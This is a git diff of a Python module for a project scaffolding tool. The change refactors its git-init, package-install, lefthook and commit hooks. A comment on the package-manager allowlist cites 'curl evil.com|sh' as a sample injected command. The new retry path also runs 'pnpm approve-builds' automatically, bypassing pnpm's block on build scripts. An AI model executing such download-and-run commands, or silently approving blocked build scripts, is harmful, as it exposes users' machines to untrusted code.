@@ -1,21 +1,25 @@
-"""InitWorker 钩子执行 — 内置钩子 + 顶层 init_project()。
+"""InitWorker 钩子执行 — 内置钩子。
 
-从 scaffold.py 拆分（v2.2 Phase I, P2.5）。
+从 scaffold_phases.py 拆分（v2.2 Phase I, P2.5）。
 PR#3 P1-1: merge_incremental 迁出至 phases/finalize.py (消除跨模块延迟 import 循环)。
 
 模块内容：
 - run_builtin_hooks()  : git init / package_manager install / lefthook install / git add+commit
-- init_project()       : 顶层便利函数
 """
 
 from __future__ import annotations
 
 import logging
-import shutil
 import subprocess
+from collections.abc import Callable
 from pathlib import Path
+from typing import TYPE_CHECKING
 
+from .config_types import coerce_bool
 from .errors import HookExecutionError
+
+if TYPE_CHECKING:
+    from .answers import AnswersMap
 
 _logger = logging.getLogger(__name__)
 
@@ -23,7 +27,7 @@ _logger = logging.getLogger(__name__)
 # 各调用点可单独指定更短超时 (git config/git init/git add/git commit 是快速操作).
 # 透传链路: CLI --hook-timeout → InitWorker.hook_timeout → run_tasks_phase.default_timeout
 #   → run_builtin_hooks.default_timeout.
-_DEFAULT_SUBPROCESS_TIMEOUT = 300
+DEFAULT_SUBPROCESS_TIMEOUT = 300
 
 # SE-P1-1: 包管理器白名单 — 防止恶意 answers (--from-answers from untrusted) 注入
 # 任意命令名 (如 pm='rm' / 'curl evil.com|sh' / 'shutdown')。白名单是单一执行源,
@@ -31,25 +35,54 @@ _DEFAULT_SUBPROCESS_TIMEOUT = 300
 _ALLOWED_PACKAGE_MANAGERS = frozenset({
     "npm", "pnpm", "yarn", "bun",  # Node.js
     "uv", "poetry", "pip",          # Python
-    "cargo",                         # Rust
+    "cargo", "go",                   # Rust / Go
+    "mvn", "gradle",                 # Java
 })
 
 # PE-P0-1: 每个 PM 的依赖安装命令 — uv 不用 install 用 sync; cargo / go 无独立 install
 # 阶段 (build / mod download 时下载), 标 None 跳过
-_PM_INSTALL_CMD: dict[str, list[str] | None] = {
+PM_INSTALL_CMD: dict[str, list[str] | None] = {
     "npm": ["npm", "install"],
     "pnpm": ["pnpm", "install"],
     "yarn": ["yarn", "install"],
     "bun": ["bun", "install"],
-    "uv": ["uv", "sync", "--extra", "dev"],  # uv sync 默认不含 dev extras, init 后需可跑测试 → 加上 dev
+    # uv sync 默认不含 dev extras, init 后需可跑测试 → 加上 dev
+    "uv": ["uv", "sync", "--extra", "dev"],
     "poetry": ["poetry", "install"],
     "pip": ["pip", "install", "-e", "."],
     "cargo": None,                  # cargo build 自动 fetch, 无 install 阶段
     "go": None,                     # go mod download 在 build 时执行, 无 install 阶段
+    "mvn": None,                    # Maven: mvn compile 自动下载依赖, 无独立 install 阶段
+    "gradle": None,                 # Gradle: gradle build 自动下载依赖, 无独立 install 阶段
 }
 
 
-def _validate_package_manager(pm: str) -> None:
+def _subprocess_ok(result: subprocess.CompletedProcess | None) -> bool:
+    """检查 subprocess 结果是否成功 — result 非 None 且 returncode == 0."""
+    return result is not None and result.returncode == 0
+
+
+def subprocess_run(
+    cmd: list[str] | str,
+    *,
+    cwd: Path,
+    timeout: int,
+    env: dict[str, str] | None = None,
+    shell: bool = False,
+) -> subprocess.CompletedProcess:
+    """Wrapper around subprocess.run with project-wide defaults.
+
+    Consolidates repeated capture_output=True, text=True, encoding="utf-8",
+    errors="replace" from all call sites into a single helper.
+    """
+    return subprocess.run(
+        cmd, cwd=cwd, capture_output=True, text=True,
+        encoding="utf-8", errors="replace", timeout=timeout,
+        env=env or None, shell=shell,
+    )
+
+
+def validate_package_manager(pm: str) -> None:
     """SE-P1-1: pm 必须在白名单内 — 不在白名单直接拒绝, 不调用 subprocess.
 
     Why: 之前 [pm, 'install'] 直接以 pm 为 argv[0], 攻击者可在 answers 文件
@@ -58,7 +91,7 @@ def _validate_package_manager(pm: str) -> None:
     if pm not in _ALLOWED_PACKAGE_MANAGERS:
         raise HookExecutionError(
             command=f"{pm} install",
-            exit_code=-1,
+            subprocess_returncode=-1,
             stderr=(
                 f"package_manager='{pm}' 不在白名单内 (SE-P1-1)."
                 f"允许: {sorted(_ALLOWED_PACKAGE_MANAGERS)}."
@@ -67,7 +100,37 @@ def _validate_package_manager(pm: str) -> None:
         )
 
 
-def _has_package_file(tmpdir: Path, pm: str) -> bool:
+def run_pm_install_cmd(
+    pm: str,
+    target_dir: Path,
+    *,
+    timeout: int = 300,
+) -> subprocess.CompletedProcess:
+    """验证 PM 白名单并执行安装命令。调用方负责错误报告。
+
+    Returns:
+        CompletedProcess — 调用方检查 returncode 决定成功/失败。
+
+    Raises:
+        HookExecutionError: PM 不在白名单 (SE-P1-1)。
+        FileNotFoundError: PM 可执行文件未找到。
+        subprocess.TimeoutExpired: 安装超时。
+    """
+    validate_package_manager(pm)
+    install_cmd = PM_INSTALL_CMD.get(pm)
+    if install_cmd is None:
+        raise HookExecutionError(
+            command=f"{pm} install",
+            subprocess_returncode=-1,
+            stderr=(
+                f"no install command for '{pm}' (cargo/go have no separate install phase)."
+                f"允许的 PM: {sorted(PM_INSTALL_CMD.keys())}"
+            ),
+        )
+    return subprocess_run(install_cmd, cwd=target_dir, timeout=timeout)
+
+
+def has_package_file(tmpdir: Path, pm: str) -> bool:
     """检查项目是否有对应包管理器的配置文件。"""
     pm_file_map = {
         "npm": "package.json",
@@ -76,9 +139,65 @@ def _has_package_file(tmpdir: Path, pm: str) -> bool:
         "bun": "package.json",
         "uv": "pyproject.toml",
         "poetry": "pyproject.toml",
+        "pip": "pyproject.toml",
+        "mvn": "pom.xml",
+        "gradle": "build.gradle",
     }
     expected = pm_file_map.get(pm, "package.json")
     return (tmpdir / expected).exists()
+
+
+def _is_pnpm_ignored_builds(stderr: str) -> bool:
+    """检测 pnpm v11+ ERR_PNPM_IGNORED_BUILDS — 非致命错误，包已安装，仅构建脚本未执行。"""
+    return "ERR_PNPM_IGNORED_BUILDS" in stderr
+
+
+def _run_pm_install_with_retry(
+    pm: str,
+    target_dir: Path,
+    timeout: int,
+    *,
+    max_attempts: int = 2,
+    retry_delay: float = 2.0,
+) -> subprocess.CompletedProcess:
+    """执行 PM install，非零退出码时自动修复并重试。
+
+    pnpm v10+ 场景：ERR_PNPM_IGNORED_BUILDS → 自动 approve-builds → 重试 install。
+    网络抖动场景：等待 retry_delay 秒后重试一次。
+    重试也失败则返回最后一次的结果，由调用方按正常失败路径处理。
+    """
+    import time as _time
+
+    result = run_pm_install_cmd(pm, target_dir, timeout=timeout)
+    if result.returncode == 0:
+        return result
+
+    # P0: pnpm v10+ ignored builds — 自动 approve 后重试，而非让用户手动处理
+    if pm == "pnpm" and _is_pnpm_ignored_builds(result.stderr or ""):
+        _logger.info("pnpm 阻止了构建脚本，自动执行 pnpm approve-builds...")
+        try:
+            approve_result = subprocess_run(
+                ["pnpm", "approve-builds"],
+                cwd=target_dir, timeout=timeout,
+            )
+        except (subprocess.TimeoutExpired, FileNotFoundError, OSError):
+            _logger.debug("pnpm approve-builds 失败", exc_info=True)
+        else:
+            if approve_result.returncode == 0:
+                result = run_pm_install_cmd(pm, target_dir, timeout=timeout)
+                if result.returncode == 0:
+                    _logger.info("pnpm approve-builds + install 成功")
+                return result
+
+    # 网络抖动兜底：等待后重试一次
+    cmd_str = " ".join(PM_INSTALL_CMD[pm])
+    _logger.warning("首次 %s 失败 (exit=%d)，%ds 后重试...", cmd_str, result.returncode, int(retry_delay))
+    _time.sleep(retry_delay)
+
+    retry_result = run_pm_install_cmd(pm, target_dir, timeout=timeout)
+    if retry_result.returncode == 0:
+        _logger.info("重试 %s 成功", cmd_str)
+    return retry_result
 
 
 def _ensure_git_config(project_dir: Path) -> None:
@@ -93,40 +212,131 @@ def _ensure_git_config(project_dir: Path) -> None:
     """
     for key, default in [("user.email", "ae@init.local"), ("user.name", "ae init")]:
         try:
-            result = subprocess.run(
+            result = subprocess_run(
                 ["git", "-C", str(project_dir), "config", key],
-                capture_output=True, text=True,
-                encoding="utf-8", errors="replace",
-                timeout=10,
+                cwd=project_dir, timeout=10,
             )
         except subprocess.TimeoutExpired:
-            # best-effort: 跳过, 用 git 全局默认即可
+            _logger.debug("git config %s timed out, using global defaults", key, exc_info=True)
             continue
         if result.returncode != 0 or not result.stdout.strip():
             try:
-                subprocess.run(
+                result = subprocess_run(
                     ["git", "-C", str(project_dir), "config", key, default],
-                    capture_output=True, text=True,
-                    encoding="utf-8", errors="replace",
-                    timeout=10,
+                    cwd=project_dir, timeout=10,
                 )
             except subprocess.TimeoutExpired:
+                _logger.debug("git config %s (set default) timed out, using global defaults", key, exc_info=True)
                 continue
 
 
-def _coerce_bool(val) -> bool:
-    """将 answers 中可能为空字符串的布尔值转为 Python bool."""
-    if isinstance(val, bool):
-        return val
-    if val is None:
+def _git_init(tmpdir: Path, _fail) -> bool:
+    """git init with branch fallback (git < 2.28 compatibility)。返回 git_ok。"""
+    git_ok = True
+    try:
+        result = subprocess_run(
+            ["git", "init", "-b", "main"],
+            cwd=tmpdir, timeout=15,
+        )
+    except subprocess.TimeoutExpired:
+        _logger.debug("git init timed out after 15s", exc_info=True)
+        _fail("git init", -1, "git init timed out after 15s")
         return False
-    if isinstance(val, str):
-        return val.strip().lower() in ("true", "yes", "y", "1")
-    return bool(val)
+    if not _subprocess_ok(result):
+        if "unknown option" in result.stderr.lower() or "unknown switch" in result.stderr.lower():
+            try:
+                result = subprocess_run(
+                    ["git", "init"], cwd=tmpdir, timeout=15,
+                )
+            except subprocess.TimeoutExpired:
+                _logger.debug("git init (fallback) timed out after 15s", exc_info=True)
+                _fail("git init", -1, "git init timed out after 15s")
+                return False
+        if not _subprocess_ok(result):
+            _fail("git init", result.returncode, result.stderr)
+            git_ok = False
+    return git_ok
+
+
+def run_pm_install_and_report(
+    answers: AnswersMap,
+    target_dir: Path,
+    timeout: int = 300,
+    quiet: bool = False,
+    no_install: bool = False,
+    _fail: Callable[[str, int, str], bool] | None = None,
+) -> None:
+    """共享 PM install 逻辑 — phase_post_install 与 run_builtin_hooks 共用."""
+    pm = answers.get("package_manager")
+    if no_install and pm:
+        if not quiet:
+            _logger.info("  (skipping %s install: --no-install flag set)", pm)
+        return
+    if not pm or not has_package_file(target_dir, pm):
+        if pm and not has_package_file(target_dir, pm) and not quiet:
+            _logger.info("  (skipping %s install: no package file found)", pm)
+        return
+    if PM_INSTALL_CMD.get(pm) is None:
+        if not quiet:
+            _logger.info("  (skipping %s install: no separate install phase)", pm)
+        return
+    try:
+        result = _run_pm_install_with_retry(pm, target_dir, timeout)
+        if result.returncode != 0:
+            cmd_str = " ".join(PM_INSTALL_CMD[pm])
+            if _is_pnpm_ignored_builds(result.stderr or ""):
+                if not quiet:
+                    _logger.warning(
+                        "%s: 依赖已安装，但 pnpm 阻止了构建脚本。"
+                        " 运行 'pnpm approve-builds' 批准构建后执行 'pnpm install'。",
+                        cmd_str,
+                    )
+                return
+            if _fail is not None:
+                _fail(cmd_str, result.returncode,
+                      f"exit={result.returncode}, run '{cmd_str}' manually")
+            elif not quiet:
+                _logger.warning("warning: %s failed: exit=%d", cmd_str, result.returncode)
+    except (FileNotFoundError, OSError) as e:
+        cmd_str = " ".join(PM_INSTALL_CMD[pm])
+        if _fail is not None:
+            _fail(cmd_str, 127,
+                  f"'{PM_INSTALL_CMD[pm][0]}' not found ({e}), run '{cmd_str}' manually")
+        elif not quiet:
+            _logger.warning("warning: %s not found: %s", cmd_str, e)
+    except subprocess.TimeoutExpired:
+        cmd_str = " ".join(PM_INSTALL_CMD[pm])
+        if _fail is not None:
+            _fail(cmd_str, -1, f"{cmd_str} timed out after {timeout}s")
+        elif not quiet:
+            _logger.warning("warning: %s timed out after %ds", cmd_str, timeout)
+
+
+def _git_add_commit_step(tmpdir: Path, git_ok: bool, _fail) -> bool:
+    """git add -A + git commit — 从 run_builtin_hooks 提取."""
+    if not git_ok:
+        return git_ok
+    for cmd, label, tmout in [
+        (["git", "add", "-A"], "git add", 30),
+        (["git", "commit", "-m", "chore(init): scaffolded by ae init"], "git commit", 30),
+    ]:
+        try:
+            result = subprocess_run(
+                cmd, cwd=tmpdir, timeout=tmout,
+            )
+        except subprocess.TimeoutExpired:
+            _logger.debug("%s timed out after %ds", label, tmout, exc_info=True)
+            _fail(label, -1, f"{label} timed out after {tmout}s")
+            git_ok = False
+            continue
+        if not _subprocess_ok(result):
+            _fail(label, result.returncode, result.stderr)
+            git_ok = False
+    return git_ok
 
 
 def run_builtin_hooks(
-    answers,
+    answers: AnswersMap,
     tmpdir: Path,
     strict: bool = False,
     quiet: bool = False,
@@ -136,110 +346,71 @@ def run_builtin_hooks(
     """执行内置钩子:git init / package_manager install / lefthook / git add+commit。
 
     strict=True 时任意步骤失败抛 HookExecutionError，否则 warning 继续。
-    quiet=True 时抑制 warning 输出（strict 模式下异常正常抛出）。
-    no_install=True 时跳过 package_manager install 步骤（CI/离线场景）。
-    default_timeout=None 走 _DEFAULT_SUBPROCESS_TIMEOUT (300s); 用户可通过
-    CLI --hook-timeout 显式覆盖（透传到此处）。
-
-    PE-AUDIT-P0-1: 所有 subprocess 调用均有 timeout,防止网络挂死/锁等待/交互式
-    编辑器等场景导致 ae init 永久 hang。
     """
-    timeout = default_timeout if default_timeout is not None else _DEFAULT_SUBPROCESS_TIMEOUT
+    timeout = default_timeout if default_timeout is not None else DEFAULT_SUBPROCESS_TIMEOUT
     _ensure_git_config(tmpdir)
 
-    def _fail(cmd: str, rc: int, stderr: str) -> None:
+    def _fail(cmd: str, rc: int, stderr: str) -> bool:
         if strict:
-            raise HookExecutionError(command=cmd, exit_code=rc, stderr=stderr)
+            raise HookExecutionError(command=cmd, subprocess_returncode=rc, stderr=stderr)
         if not quiet:
-            # PE-AUDIT-P0-2: warning 走 _logger 而非 print,便于 caplog 验证与库调用方抑制
             _logger.warning("%s failed: %s", cmd, stderr.strip())
+        return True
 
-    # git init with branch fallback (git < 2.28 compatibility)
-    try:
-        result = subprocess.run(
-            ["git", "init", "-b", "main"],
-            cwd=tmpdir, capture_output=True, text=True,
-            encoding="utf-8", errors="replace",
-            timeout=15,
-        )
-    except subprocess.TimeoutExpired:
-        _fail("git init", -1, "git init timed out after 15s")
-        result = None
-    if result is not None and result.returncode != 0:
-        if "unknown option" in result.stderr.lower() or "unknown switch" in result.stderr.lower():
-            try:
-                result = subprocess.run(["git", "init"], cwd=tmpdir, capture_output=True, text=True,
-                                         encoding="utf-8", errors="replace", timeout=15)
-            except subprocess.TimeoutExpired:
-                _fail("git init", -1, "git init timed out after 15s")
-                result = None
-        if result is not None and result.returncode != 0:
-            _fail("git init", result.returncode, result.stderr)
+    git_ok = _git_init(tmpdir, _fail)
+    run_pm_install_and_report(answers, tmpdir, timeout, quiet, no_install, _fail)
 
-    pm = answers.get("package_manager")
-    if no_install and pm:
-        if not quiet:
-            # PE-AUDIT-P0-2: info 走 logger
-            _logger.info("  (skipping %s install: --no-install flag set)", pm)
-    elif pm and _has_package_file(tmpdir, pm):
-        # SE-P1-1: 拒绝非白名单 PM (防 RCE via 恶意 answers 文件)
-        _validate_package_manager(pm)
-        # PE-P0-1: 按 PM 选用正确命令 (uv sync / cargo 跳过 / go 跳过)
-        install_cmd = _PM_INSTALL_CMD.get(pm)
-        if install_cmd is None:
-            if not quiet:
-                _logger.info("  (skipping %s install: no separate install phase)", pm)
-        else:
-            try:
-                result = subprocess.run(install_cmd, cwd=tmpdir, capture_output=True, text=True,
-                                         encoding="utf-8", errors="replace", timeout=timeout)
-                if result.returncode != 0:
-                    cmd_str = " ".join(install_cmd)
-                    _fail(cmd_str, result.returncode,
-                          f"exit={result.returncode}, run '{cmd_str}' manually")
-            except (FileNotFoundError, OSError) as e:
-                cmd_str = " ".join(install_cmd)
-                _fail(cmd_str, 127,
-                      f"'{install_cmd[0]}' not found ({e}), run '{cmd_str}' manually")
-            except subprocess.TimeoutExpired:
-                cmd_str = " ".join(install_cmd)
-                _fail(cmd_str, -1, f"{cmd_str} timed out after {timeout}s")
-    elif pm and not _has_package_file(tmpdir, pm):
-        if not getattr(answers, 'quiet', False):
-            # PE-AUDIT-P0-2: info 走 logger
-            _logger.info("  (skipping %s install: no package file found)", pm)
-
-    if _coerce_bool(answers.get("use_lefthook")):
+    if coerce_bool(answers.get("use_lefthook")):
         try:
-            result = subprocess.run(
-                ["lefthook", "install"], cwd=tmpdir, capture_output=True, text=True,
-                encoding="utf-8", errors="replace",
-                timeout=60,
+            result = subprocess_run(
+                ["lefthook", "install"], cwd=tmpdir, timeout=60,
             )
         except subprocess.TimeoutExpired:
-            result = type("R", (), {"returncode": -1, "stderr": "lefthook install timed out after 60s"})()
-        if result.returncode != 0:
+            _logger.debug("lefthook install timed out after 60s", exc_info=True)
+            _fail("lefthook install", -1, "lefthook install timed out after 60s")
+            result = None
+        if result is not None and not _subprocess_ok(result):
             _fail("lefthook install", result.returncode, result.stderr)
 
-    try:
-        result = subprocess.run(
-            ["git", "add", "-A"], cwd=tmpdir, capture_output=True, text=True,
-            encoding="utf-8", errors="replace",
-            timeout=30,
-        )
-    except subprocess.TimeoutExpired:
-        result = type("R", (), {"returncode": -1, "stderr": "git add timed out after 30s"})()
-    if result.returncode != 0:
-        _fail("git add", result.returncode, result.stderr)
+    _git_add_commit_step(tmpdir, git_ok, _fail)
 
+
+def ensure_git_repo(project_dir: Path, quiet: bool = False) -> bool:
+    """B4/B5: 在目标目录初始化 git 仓库并创建初始提交。
+
+    用于 Phase 5 在 dst_path 创建 git 仓库——Phase 4 的 git init 在 tmpdir
+    执行，增量模式 merge_incremental 会跳过 .git（EXCLUDED_DIRS），导致 dst_path
+    没有 git 仓库。本函数在文件复制到 dst_path 后调用，确保最终目录有 git 仓库。
+
+    全量模式下 .git 已被 _atomic_copytree 复制,dst_path 已有 git 仓库;
+    git init 安全无副作用,有未提交变更时才创建新提交,无变更则跳过。
+
+    Returns:
+        True 如果 git 仓库初始化并提交成功，False 如果有步骤失败。
+    """
+    _ensure_git_config(project_dir)
+
+    def _fail(cmd: str, rc: int, stderr: str) -> bool:
+        if not quiet:
+            _logger.warning("%s failed: %s", cmd, stderr.strip())
+        return True
+
+    git_ok = _git_init(project_dir, _fail)
+    if not git_ok:
+        return False
+
+    # Check if there's anything to commit — skip commit if working tree is
+    # already clean (e.g., fresh mode where .git was copied from tmpdir and
+    # post_install didn't produce any changes).
     try:
-        result = subprocess.run(
-            ["git", "commit", "-m", "chore(init): scaffolded by ae init"],
-            cwd=tmpdir, capture_output=True, text=True,
-            encoding="utf-8", errors="replace",
-            timeout=30,
+        status_result = subprocess_run(
+            ["git", "-C", str(project_dir), "status", "--porcelain"],
+            cwd=project_dir, timeout=10,
         )
     except subprocess.TimeoutExpired:
-        result = type("R", (), {"returncode": -1, "stderr": "git commit timed out after 30s"})()
-    if result.returncode != 0:
-        _fail("git commit", result.returncode, result.stderr)
+        _logger.debug("git status --porcelain timed out", exc_info=True)
+        return git_ok
+    if not status_result.stdout.strip():
+        return True  # Nothing to commit, repo is clean
+
+    return _git_add_commit_step(project_dir, git_ok, _fail)
